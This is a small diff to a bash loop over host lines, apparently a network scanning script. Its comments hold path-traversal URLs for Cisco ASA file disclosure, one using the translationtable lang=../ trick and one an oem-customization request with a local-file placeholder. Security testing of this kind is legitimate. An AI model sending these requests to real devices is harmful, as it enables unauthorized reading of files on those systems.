@@ -14,8 +14,10 @@ set -f          # disable globbing
 
 while IFS= read -r line; do
 
+    
+    # asa file disclosures 
+    # https://$line/+CSCOT+/translationtable?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
     #need to work on this one wrt filenames
-    # asa file disclosure https://$line/+CSCOT+/translationtable?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
     # https://$line/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/[LOCAL-FILE]
 
     #sslscan an ip
